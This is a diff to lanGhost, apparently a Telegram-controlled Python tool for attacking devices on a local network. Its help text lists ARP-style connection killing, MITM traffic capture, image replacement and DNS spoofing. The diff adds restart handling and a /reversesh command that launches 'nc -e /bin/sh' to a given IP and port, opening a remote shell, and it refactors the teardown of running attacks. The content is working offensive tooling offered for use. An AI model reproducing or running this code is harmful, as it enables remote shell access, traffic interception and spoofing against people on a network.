@@ -24,6 +24,7 @@ try:
     import time
     import nmap
     import json
+    import sys
     import os
 except KeyboardInterrupt:
     print("\n\n[+] Stopping...")
@@ -341,6 +342,51 @@ def attackManager(action, attack_type=False, target=False, ID=False):
         else:
             return data
 
+def stop_updater():
+    global updater
+    updater.stop()
+
+def stopping():
+    global script_path
+    print("\n\n[+] Stopping...")
+    stop_updater_t = threading.Thread(target=stop_updater)
+    stop_updater_t.start()
+    os.system("sudo screen -S lanGhost-mitm -X stuff '^C\n'")
+    os.system("sudo screen -S lanGhost-dns -X stuff '^C\n'")
+    iptables("flush")
+    attacks = attackManager("list")
+    if not attacks == []:
+        print("[+] Stopping attacks...")
+    for attack in attacks:
+        attackManager("del", ID=attack[0])
+    if not attacks == []:
+        time.sleep(5)
+    os.system("rm -r " + script_path + "lanGhost.db > /dev/null 2>&1")
+    print("[+] lanGhost stopped")
+    raise SystemExit
+
+def restart_thread():
+    os.execl(sys.executable, sys.executable, *sys.argv)
+
+def restarting():
+    global script_path
+    print("\n\n[+] Restarting...")
+    stop_updater_t = threading.Thread(target=stop_updater)
+    stop_updater_t.start()
+    os.system("sudo screen -S lanGhost-mitm -X stuff '^C\n'")
+    os.system("sudo screen -S lanGhost-dns -X stuff '^C\n'")
+    iptables("flush")
+    attacks = attackManager("list")
+    if not attacks == []:
+        print("[+] Stopping attacks...")
+    for attack in attacks:
+        attackManager("del", ID=attack[0])
+    if not attacks == []:
+        time.sleep(5)
+    os.system("rm -r " + script_path + "lanGhost.db > /dev/null 2>&1")
+    print("[+] lanGhost stopped")
+    restart_t = threading.Thread(target=restart_thread)
+    restart_t.start()
 
 # Command handlers:
 
@@ -719,7 +765,8 @@ def msg_help(bot, update):
         bot.send_message(chat_id=update.message.chat_id, text="👻 lanGhost help:\n\n/scan - Scan LAN network\n/kill [TARGET-IP] - Stop the target's network connection.\n" +\
                                                                 "/mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.\n/replaceimg [TARGET-IP] - Replace HTTP images requested by target.\n" +\
                                                                 "/spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.\n/attacks - View currently running attacks.\n" +\
-                                                                "/stop [ATTACK ID] - Stop a currently running attack.\n/help - Display this menu.\n/ping - Pong.")
+                                                                "/stop [ATTACK ID] - Stop a currently running attack.\n/restart - Restart lanGhost.\n/reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.\n" +\
+                                                                "/help - Display this menu.\n/ping - Pong.")
     except:
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
@@ -736,8 +783,49 @@ def msg_unknown(bot, update):
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
+def msg_restart(bot, update):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+
+    bot.send_message(chat_id=update.message.chat_id, text="✅ Restarting lanGhost...")
+    restarting()
+
+def msg_reversesh(bot, update, args):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+
+    try:
+        if len(args) < 2:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /reversesh [TARGET-IP] [PORT]")
+            return
+
+        target_ip = args[0]
+        port = args[1]
+
+        try:
+            socket.inet_aton(target_ip)
+        except socket.error:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ TARGET-IP is not valid... Please try again.")
+            return
+
+        try:
+            port = int(port)
+        except:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ PORT must be a number... Please try again.")
+            return
+
+        bot.send_message(chat_id=update.message.chat_id, text="✅ Starting reverse shell...")
+        os.system("sudo screen -S lanGhost-reversesh -X stuff '^C\n' > /dev/null 2>&1")
+        os.system("sudo screen -S lanGhost-reversesh -m -d nc -e /bin/sh " + target_ip + " " + str(port))
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
+
 def main():
     global admin_chatid
+    global updater
 
     updater = Updater(token=telegram_api)
     dispatcher = updater.dispatcher
@@ -771,6 +859,10 @@ def main():
     dispatcher.add_handler(spoofdns_handler)
     help_handler = CommandHandler('help', msg_help)
     dispatcher.add_handler(help_handler)
+    restart_handler = CommandHandler('restart', msg_restart)
+    dispatcher.add_handler(restart_handler)
+    reversesh_handler = CommandHandler('reversesh', msg_reversesh, pass_args=True)
+    dispatcher.add_handler(reversesh_handler)
 
     dispatcher.add_handler(MessageHandler(Filters.text, msg_unknown))
     dispatcher.add_handler(MessageHandler(Filters.command, msg_unknown))
@@ -780,20 +872,7 @@ def main():
         try:
             updater.start_polling()
         except KeyboardInterrupt:
-            print("\n\n[+] Stopping...")
-            updater.stop()
-            os.system("sudo screen -S lanGhost-mitm -X stuff '^C\n'")
-            os.system("sudo screen -S lanGhost-dns -X stuff '^C\n'")
-            iptables("flush")
-            attacks = attackManager("list")
-            if not attacks == []:
-                print("[+] Stopping attacks...")
-            for attack in attacks:
-                attackManager("del", ID=attack[0])
-            if not attacks == []:
-                time.sleep(5)
-            print("[+] lanGhost stopped")
-            raise SystemExit
+            stopping()
         except:
             print("[!!!] Telegram bot crashed, restating...")
 
